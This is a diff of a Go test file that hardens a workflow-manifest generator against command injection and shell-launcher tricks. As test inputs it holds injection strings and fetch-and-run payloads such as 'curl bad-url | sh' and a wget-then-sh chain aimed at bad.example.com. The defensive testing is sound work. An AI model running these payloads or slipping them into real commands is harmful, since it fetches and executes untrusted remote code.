@@ -45,18 +45,6 @@ func TestGenerateWorkflowRequiresImageOrModel(t *testing.T) {
 	}
 }
 
-func TestGenerateWorkflowRejectsShellLauncherCommand(t *testing.T) {
-	_, _, err := GenerateWorkflow(WorkflowRequest{
-		Name:    "train",
-		Image:   "python:3.11-slim",
-		Command: []string{"/bin/sh", "-c"},
-		Args:    []string{"echo hi"},
-	})
-	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
-		t.Fatalf("err=%v", err)
-	}
-}
-
 func TestGenerateWorkflowUnknownModelDoesNotUseShell(t *testing.T) {
 	manifest, _, err := GenerateWorkflow(WorkflowRequest{
 		Name:  "train-custom",
@@ -70,5 +58,148 @@ func TestGenerateWorkflowUnknownModelDoesNotUseShell(t *testing.T) {
 	}
 	if !strings.Contains(manifest, "command:") || !strings.Contains(manifest, "- echo") {
 		t.Fatalf("manifest=%s", manifest)
+	}
+}
+
+// TestGenerateWorkflowInjectionShapedModelIsArgvSafe covers acceptance criterion 2 of SEC-006:
+// injection-shaped model strings must be passed as literal argv args, never evaluated by a shell.
+func TestGenerateWorkflowInjectionShapedModelIsArgvSafe(t *testing.T) {
+	maliciousModels := []string{
+		"$(touch /tmp/pwn)",
+		"`id`",
+		"model; curl bad-url | sh",
+		"model && wget http://bad.example.com/x -O /tmp/x && sh /tmp/x",
+	}
+	for _, model := range maliciousModels {
+		manifest, _, err := GenerateWorkflow(WorkflowRequest{
+			Name:  "train-custom",
+			Model: model,
+		})
+		if err != nil {
+			t.Fatalf("model=%q: unexpected error: %v", model, err)
+		}
+		// Must use echo (argv-safe), never sh/bash/shell launcher
+		if strings.Contains(manifest, "/bin/sh") || strings.Contains(manifest, "bash -c") {
+			t.Fatalf("model=%q: manifest uses shell launcher:\n%s", model, manifest)
+		}
+		if !strings.Contains(manifest, "- echo") {
+			t.Fatalf("model=%q: manifest missing expected echo command:\n%s", model, manifest)
+		}
+	}
+}
+
+const shellPayload = "curl bad-url | sh"
+
+// TestGenerateWorkflowRejectsShellLauncher covers every way a shell launcher can
+// be spread across command and args, including interleaved flags that a
+// fixed-position check misses.
+func TestGenerateWorkflowRejectsShellLauncher(t *testing.T) {
+	cases := []struct {
+		name    string
+		command []string
+		args    []string
+	}{
+		{"command holds flag", []string{"/bin/sh", "-c"}, []string{shellPayload}},
+		{"args hold flag", []string{"/bin/sh"}, []string{"-c", shellPayload}},
+		{"bash split", []string{"bash"}, []string{"-c", shellPayload}},
+		{"interactive flag before split", []string{"/bin/sh", "-i"}, []string{"-c", shellPayload}},
+		{"interactive flag inside args", []string{"bash"}, []string{"-i", "-c", shellPayload}},
+		{"trace flag before split", []string{"/bin/sh", "-x"}, []string{"-c", shellPayload}},
+		{"entirely in command", []string{"/bin/sh", "-i", "-c", shellPayload}, nil},
+		{"entirely in args", nil, []string{"/bin/sh", "-c", shellPayload}},
+		{"absolute usr path", []string{"/usr/bin/bash"}, []string{"-c", shellPayload}},
+		{"dash", []string{"dash"}, []string{"-c", shellPayload}},
+		{"ash", []string{"ash"}, []string{"-c", shellPayload}},
+		{"ksh", []string{"ksh"}, []string{"-c", shellPayload}},
+		{"busybox", []string{"busybox"}, []string{"sh", "-c", shellPayload}},
+		{"zsh", []string{"zsh"}, []string{"-c", shellPayload}},
+		{"env wrapper", []string{"env"}, []string{"sh", "-c", shellPayload}},
+		{"absolute env wrapper", []string{"/usr/bin/env"}, []string{"bash", "-c", shellPayload}},
+		{"nice wrapper with own flags", []string{"nice", "-n", "10"}, []string{"bash", "-c", shellPayload}},
+		{"timeout wrapper", []string{"timeout", "5"}, []string{"sh", "-lc", shellPayload}},
+		{"env with assignment", []string{"env", "FOO=bar"}, []string{"sh", "-c", shellPayload}},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			_, _, err := GenerateWorkflow(WorkflowRequest{
+				Name:    "train",
+				Image:   "python:3.11-slim",
+				Command: tc.command,
+				Args:    tc.args,
+			})
+			if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+				t.Fatalf("command=%v args=%v: err=%v", tc.command, tc.args, err)
+			}
+		})
+	}
+}
+
+// TestGenerateWorkflowRejectsClusteredShellFlags checks flag clusters that still
+// make the shell evaluate the next argument as a command string.
+func TestGenerateWorkflowRejectsClusteredShellFlags(t *testing.T) {
+	for _, flag := range []string{"-lc", "-ec", "-elc", "-xc", "-cx", "-ce", "-cl", "-icx"} {
+		shapes := []struct {
+			command []string
+			args    []string
+		}{
+			{[]string{"/bin/sh"}, []string{flag, shellPayload}},
+			{[]string{"zsh", flag}, []string{shellPayload}},
+			{[]string{"bash", "-i"}, []string{flag, shellPayload}},
+		}
+		for _, shape := range shapes {
+			_, _, err := GenerateWorkflow(WorkflowRequest{
+				Name:    "train",
+				Image:   "python:3.11-slim",
+				Command: shape.command,
+				Args:    shape.args,
+			})
+			if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+				t.Fatalf("command=%v args=%v: err=%v", shape.command, shape.args, err)
+			}
+		}
+	}
+}
+
+// TestGenerateWorkflowRejectsShellScriptWithOwnCFlag pins a deliberate false
+// positive: a -c belonging to the script a shell runs is indistinguishable from
+// the shell's own, so the check fails closed. Set the image entrypoint instead.
+func TestGenerateWorkflowRejectsShellScriptWithOwnCFlag(t *testing.T) {
+	_, _, err := GenerateWorkflow(WorkflowRequest{
+		Name:    "train",
+		Image:   "python:3.11-slim",
+		Command: []string{"/bin/sh"},
+		Args:    []string{"app.sh", "-c", "config.yaml"},
+	})
+	if err == nil || !strings.Contains(err.Error(), "may not use shell launcher") {
+		t.Fatalf("err=%v", err)
+	}
+}
+
+// TestGenerateWorkflowAllowsNonShellEntrypoints guards the widened scan against
+// rejecting legitimate entrypoints that merely carry a -c flag of their own.
+func TestGenerateWorkflowAllowsNonShellEntrypoints(t *testing.T) {
+	cases := []struct {
+		name    string
+		command []string
+		args    []string
+	}{
+		{"python with own -c flag", []string{"python"}, []string{"train.py", "-c", "config.yaml"}},
+		{"shell running a script", []string{"/bin/sh"}, []string{"/app/run.sh"}},
+		{"shell with long flag only", []string{"bash"}, []string{"--login", "/app/run.sh"}},
+		{"uppercase noclobber flag", []string{"/bin/sh"}, []string{"-C", "/app/run.sh"}},
+		{"no command or args", nil, nil},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			_, _, err := GenerateWorkflow(WorkflowRequest{
+				Name:    "train",
+				Image:   "python:3.11-slim",
+				Command: tc.command,
+				Args:    tc.args,
+			})
+			if err != nil {
+				t.Fatalf("command=%v args=%v: unexpected error: %v", tc.command, tc.args, err)
+			}
+		})
 	}
 }
